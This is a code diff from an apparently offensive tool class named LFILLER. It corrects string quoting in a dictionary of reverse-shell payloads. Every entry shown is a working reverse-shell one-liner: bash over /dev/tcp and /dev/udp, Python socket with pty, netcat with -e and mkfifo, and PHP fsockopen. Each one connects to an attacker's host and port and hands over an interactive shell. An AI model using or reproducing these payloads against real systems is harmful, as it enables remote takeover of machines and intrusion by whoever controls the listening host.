@@ -585,10 +585,10 @@ class LFILLER:
             'sh_fd_5': f'exec 5<>/dev/tcp/{self.lhost}/{self.lport};cat <&5 | while read line; do $line 2>&5 >&5; done',
             'sh_fd_direct': f'sh -i 5<> /dev/tcp/{self.lhost}/{self.lport} 0<&5 1>&5 2>&5',
             'bash_udp': f'sh -i >& /dev/udp/{self.lhost}/{self.lport} 0>&1',
-            'python': f'python3 -c "import socket,os,pty;s=socket.socket();s.connect((\\'{self.lhost}\',{self.lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\\'/bin/sh\\')"',
+            'python': f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{self.lhost}\",{self.lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'",
             'nc_e': f'nc -e /bin/sh {self.lhost} {self.lport}',
             'nc_mkfifo': f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {self.lhost} {self.lport} >/tmp/f',
-            'php': f'php -r \\'$s=fsockopen("{self.lhost}",{self.lport});exec("/bin/sh -i <&3 >&3 2>&3");\\''
+            'php': f"php -r '$s=fsockopen(\"{self.lhost}\",{self.lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
         }
         
         sent_count = 0
